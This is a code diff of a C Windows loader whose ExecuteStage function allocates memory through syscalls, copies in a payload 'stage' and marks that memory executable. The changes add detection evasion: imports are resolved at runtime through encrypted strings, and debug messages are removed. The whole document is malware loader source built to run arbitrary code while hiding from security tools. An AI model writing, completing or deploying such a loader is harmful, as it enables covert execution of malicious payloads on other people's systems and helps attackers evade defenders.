@@ -1,8 +1,11 @@
 #include <stdio.h>
 #include <windows.h>
+#include <winhttp.h>
 
 #include "loader.h"
+#include "strings.h"
 #include "syscalls.h"
+#include "imports.h"
 
 VOID ExecuteStage(CHAR* Stage, DWORD sSize)
 {
@@ -44,10 +47,11 @@ VOID ExecuteStage(CHAR* Stage, DWORD sSize)
     }
 
     // alloc the memory we need
-    status = NtAllocateVirtualMemory(GetCurrentProcess(), &pBuffer, 0, &uSize, MEM_COMMIT, PAGE_READWRITE);
+    GetCurrentProcess_ rGetCurrentProcess = (GetCurrentProcess_)GetProcAddress(LoadLibrary("kernel32.dll"), decrypt_string(STRING_KERNEL32_CPROC, STRING_KERNEL32_CPROC_KEY));
+
+    status = NtAllocateVirtualMemory(rGetCurrentProcess(), &pBuffer, 0, &uSize, MEM_COMMIT, PAGE_READWRITE);
     if (status != 0)
     {
-        DEBUG("Failed to NtAllocateVirtualMemory");
         return;
     }
 
@@ -55,10 +59,9 @@ VOID ExecuteStage(CHAR* Stage, DWORD sSize)
     memcpy(pBuffer, Stage, sSize);
 
     // change the permisions to PAGE_EXECUTE_READWRITE
-    status = NtProtectVirtualMemory(GetCurrentProcess(), &pBuffer, &uSize, PAGE_EXECUTE_READWRITE, &OldPro);
+    status = NtProtectVirtualMemory(rGetCurrentProcess(), &pBuffer, &uSize, PAGE_EXECUTE_READWRITE, &OldPro);
     if (status != 0)
     {
-        DEBUG("Failed to NtProtectVirtualMemory10");
         return;
     }
 
